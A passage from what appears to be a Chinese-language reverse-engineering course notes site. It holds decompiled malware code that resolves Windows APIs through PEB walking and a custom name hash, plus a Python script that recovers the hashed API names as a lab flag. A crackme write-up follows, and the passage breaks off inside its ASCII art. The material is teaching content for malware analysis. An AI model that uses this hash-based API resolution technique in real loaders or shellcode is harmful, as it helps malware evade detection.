exportTable_1-\u0026gt;AddressOfFunctions); for ( m = 0i64; m \u0026lt; num_of_names_1; ++m ) { api_name_1 = dll_base + name_array_1[m]; hash_1 = 0; do hash_1 += *api_name_1++ + __ROL4__(hash_1, 11) + 1187; while ( *api_name_1 ); if ( hash_1 == 0xCD841E17 ) v62 = dll_base + func_array_1[name_ordinal_1[m]]; } } else if ( dll_name_1 == \u0026#39;u\u0026#39; || dll_name_1 == \u0026#39;U\u0026#39; ) { v29 = *(dll_name + 1); if ( v29 == \u0026#39;s\u0026#39; || v29 == \u0026#39;S\u0026#39; ) { v33 = *(dll_name + 2); if ( v33 == \u0026#39;e\u0026#39; || v33 == \u0026#39;E\u0026#39; ) { v34 = *(dll_name + 3); if ( (v34 == \u0026#39;r\u0026#39; || v34 == \u0026#39;R\u0026#39;) \u0026amp;\u0026amp; *(dll_name + 4) == \u0026#39;3\u0026#39; \u0026amp;\u0026amp; *(dll_name + 5) == \u0026#39;2\u0026#39; ) { exportTable_2 = (dll_base + getNtHdrs(j-\u0026gt;DllBase)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); num_of_names_2 = exportTable_2-\u0026gt;NumberOfNames; name_array_2 = (dll_base + exportTable_2-\u0026gt;AddressOfNames); name_ordinal_2 = (dll_base + exportTable_2-\u0026gt;AddressOfNameOrdinals); func_array_2 = (dll_base + exportTable_2-\u0026gt;AddressOfFunctions); for ( n = 0i64; n \u0026lt; num_of_names_2; ++n ) { api_name_2 = dll_base + name_array_2[n]; hash_2 = 0; do hash_2 += *api_name_2++ + __ROL4__(hash_2, 11) + 1187; while ( *api_name_2 ); if ( hash_2 == 0x416F607 ) v63 = dll_base + func_array_2[name_ordinal_2[n]]; } } } } } } } ... :::\nRecon # #5的for-loop就是找 exported_next-stage.dll 的檔案起點 #7到後面的for-llop結束就是取得 PEB 並遍歷 _LDR_DATA_TABLE_ENTRY 基本上經過解析之後就會非常清楚這一段在做的事情就是和上面的攻擊手法一模一樣，接下來當找到想要的dll之後就會開始找想要的API，以目前的例子來說，攻擊者主要想要找==kernel32.dll==, ==msvcrt.dll==和==user32.dll== 找API的過程和想像中不一樣，他不是直接明文去找，而是把目前爬到的API name做自定義的hash之後再去比對，如果對了就放到變數中 "},{"id":415,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/","title":"Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)","section":"Securities","content":" Simple Reverse - 0x25(2023 Lab - WinMalware - 作業) # Description # 在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？ A list of all exported functions of user32.dll\nFlag format: FLAG{WindowsAPIname}\nBackground # Dynamic API Resolution Background\nRecon # 根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道__ROL4__的意思，根據x86 and amd64 instruction reference\nThe rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.\n所以很明顯的，這一段就是把hash左移11次，然後加上1187和api_name的字元\napi_name = dll_base + name_array[k]; hash = 0; do hash += __ROL4__(hash, 11) + 1187 + *api_name++;// do self-defined hash function while ( *api_name ); Exploit # kernel32_dll = open(\u0026#39;./kernel32.dll.txt\u0026#39;, \u0026#39;rb\u0026#39;).readlines() msvcrt_dll = open(\u0026#39;./msvcrt.dll.txt\u0026#39;, \u0026#39;rb\u0026#39;).readlines() user32_dll = open(\u0026#39;./user32.dll.txt\u0026#39;, \u0026#39;rb\u0026#39;).readlines() kernel32_function_hash = [0x5F00766C, 0x6D555364, 0x42B4FA0, 0xC473C85A] msvcrt_function_hash = 0xCD841E17 user32_function_hash = 0x416f607 def __ROL4__(v, b, bit_size): return (v \u0026lt;\u0026lt; b) | (v \u0026gt;\u0026gt; (bit_size - b)) \u0026amp; (2**(bit_size) - 1) # kernel32 Function Hash Compare for function_hash in kernel32_function_hash: for i in range(len(kernel32_dll)): name = kernel32_dll[i].strip() hash = 0 for j in range(len(name)): hash += __ROL4__(hash, 11, 32) + 1187 + name[j] hash = hash \u0026amp; (2**(32) - 1) if hash == function_hash: print(\u0026#34;[+] kernel32 Function - \u0026#34; + hex(function_hash) + \u0026#34; is \u0026#34; + name.decode()) break # msvcrt Function Hash Compare for i in range(len(msvcrt_dll)): name = msvcrt_dll[i].strip() hash = 0 for j in range(len(name)): hash += __ROL4__(hash, 11, 32) + 1187 + name[j] hash = hash \u0026amp; (2**(32) - 1) if hash == msvcrt_function_hash: print(\u0026#34;[+] msvcrt Function - \u0026#34; + hex(msvcrt_function_hash) + \u0026#34; is \u0026#34; + name.decode()) break # user32 Function Hash Compare for i in range(len(user32_dll)): name = user32_dll[i].strip() hash = 0 for j in range(len(name)): hash += __ROL4__(hash, 11, 32) + 1187 + name[j] hash = hash \u0026amp; (2**(32) - 1) if hash == user32_function_hash: print(\u0026#34;[+] user32 Function - \u0026#34; + hex(user32_function_hash) + \u0026#34; is \u0026#34; + name.decode()) break print(\u0026#34;Flag = FLAG{\u0026#34; + name.decode() + \u0026#34;}\u0026#34;) $ python exp-lab-6.py [+] kernel32 Function - 0x5f00766c is LoadLibraryA [+] kernel32 Function - 0x6d555364 is GetProcAddress [+] kernel32 Function - 0x42b4fa0 is VirtualAlloc [+] kernel32 Function - 0xc473c85a is FlushInstructionCache [+] msvcrt Function - 0xcd841e17 is memcpy [+] user32 Function - 0x416f607 is MessageBoxA Flag = FLAG{MessageBoxA} 結果如上\n"},{"id":416,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/","title":"Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)","section":"Securities","content":" Simple Reverse - 0x26(2023 HW - Banana Donut Verifier) # Source Code # :::spoiler Source Code\n__int64 __fastcall main(int a1, char **a2, char **a3) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] v47 = 0.0; v46 = 0.0; v42 = 0LL; memset(user_input, 0, 1024); printf(\u0026#34;Dount Verifier\\nInput: \u0026#34;); __isoc99_scanf(\u0026#34;%1023s\u0026#34;, user_input); printf(\u0026#34;\\x1B[2J\u0026#34;); // 這個意思是清除整個頁面 for ( i = 0LL; i \u0026lt;= 499; ++i ) { memset(s, 32, sizeof(s)); memset(v20, 0, sizeof(v20)); for ( j = 0.0; j \u0026lt; 6.28; j = v14 ) { v40 = 0; for ( k = 0.0; k \u0026lt; 6.28; k = v13 ) { v3 = _mm_cvtsi32_si128(LODWORD(k)); *v3.m128i_i64 = (compute_sinf)(*v3.m128i_i64);// 計算浮點數的正弦值，參考自https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/sin-sinf-sinl?view=msvc-170 v37 = COERCE_FLOAT(_mm_cvtsi128_si32(v3)); v4 = _mm_cvtsi32_si128(LODWORD(j)); *v4.m128i_i64 = (compute_conf)(*v4.m128i_i64);// 計算餘弦值，參考自https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/cos-cosf-cosl?view=msvc-170 v36 = COERCE_FLOAT(_mm_cvtsi128_si32(v4)); v5 = _mm_cvtsi32_si128(LODWORD(v47)); *v5.m128i_i64 = (compute_sinf)(*v5.m128i_i64); v35 = COERCE_FLOAT(_mm_cvtsi128_si32(v5)); v6 = _mm_cvtsi32_si128(LODWORD(j)); *v6.m128i_i64 = (compute_sinf)(*v6.m128i_i64); v34 = COERCE_FLOAT(_mm_cvtsi128_si32(v6)); v7 = _mm_cvtsi32_si128(LODWORD(v47)); *v7.m128i_i64 = (compute_conf)(*v7.m128i_i64); v33 = COERCE_FLOAT(_mm_cvtsi128_si32(v7)); v32 = v36 + 2.0; v31 = 1.0 / ((((v37 * (v36 + 2.0)) * v35) + (v34 * v33)) + 5.0); v8 = _mm_cvtsi32_si128(LODWORD(k)); *v8.m128i_i64 = (compute_conf)(*v8.m128i_i64); v30 = COERCE_FLOAT(_mm_cvtsi128_si32(v8)); v9 = _mm_cvtsi32_si128(LODWORD(v46)); *v9.m128i_i64 = (compute_conf)(*v9.m128i_i64); v29 = COERCE_FLOAT(_mm_cvtsi128_si32(v9)); v10 = _mm_cvtsi32_si128(LODWORD(v46)); *v10.m128i_i64 = (compute_sinf)(*v10.m128i_i64); v28 = COERCE_FLOAT(_mm_cvtsi128_si32(v10)); v27 = ((v37 * v32) * v33) - (v34 * v35); v26 = (((v31 * 30.0) * (((v30 * v32) * v29) - (v27 * v28))) + 40.0); v25 = (((v31 * 15.0) * ((v27 * v29) + ((v30 * v32) * v28))) + 12.0); v24 = 80 * v25 + v26; v23 = (8.0 * ((((((v34 * v35) - ((v37 * v36) * v33)) * v29) - ((v37 * v36) * v35)) - (v34 * v33)) - ((v30 * v36) * v28))); if ( v25 \u0026lt;= 21 \u0026amp;\u0026amp; v25 \u0026gt; 0 \u0026amp;\u0026amp; v26 \u0026gt; 0 \u0026amp;\u0026amp; v26 \u0026lt;= 79 \u0026amp;\u0026amp; v31 \u0026gt; v20[v24] ) { v20[v24] = v31; v11 = v23; if ( v23 \u0026lt; 0 ) v11 = 0; s[v24] = special_char[v11]; // special_char就是印出甜甜圈的素材 } if ( v40 == 30 \u0026amp;\u0026amp; v42 \u0026lt;= 0x3FF ) { v22 = v24 ^ v23 ^ (v26 + v25); v12 = v42++; *(user_input + v12) ^= v24 ^ v23 ^ (v26 + v25); } ++v40; v13 = k + 0.02; } v14 = j + 0.07000000000000001; } printf(\u0026#34;\\x1B[H\u0026#34;); // 這個代表游標回到home position for ( idx = 0; idx \u0026lt;= 0x6E0; ++idx ) // 這一段for loop就是在印出甜甜圈 { if ( idx % 80 ) v15 = s[idx]; else v15 = 10; putchar(v15); v16 = v47 + 0.00004; v47 = v16; v17 = v46 + 0.00002; v46 = v17; } usleep(30000u); // 睡眠0.03秒 } cipher_1 = verification(user_input, 0x400uLL); cipher_2 = verification(key, 0x400uLL); if ( cipher_1 == cipher_2 ) puts(\u0026#34;Donut likes your input!! :D\u0026#34;); else puts(\u0026#34;Donut Reject You!! :(\u0026#34;); puts(\u0026#34;No matter donut accept you or not. Here\u0026#39;s a bananacat for you\u0026#34;); puts(icon); puts(\u0026amp;icon[112]); puts(\u0026amp;icon[232]); puts(\u0026amp;icon[352]); puts(\u0026amp;icon[480]); puts(\u0026amp;icon[600]); puts(\u0026amp;icon[728]); puts(\u0026amp;icon[856]); puts(\u0026amp;icon[992]); puts(\u0026amp;icon[1128]); puts(\u0026amp;icon[1272]); puts(\u0026#34; ░ ░▓▒▒▒▒▒░░░░░░░░░░▒▒▒▓▒░░ \\x00\\x00 ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \\x00\\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \\x00\\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \\x00\\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \\x00\\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 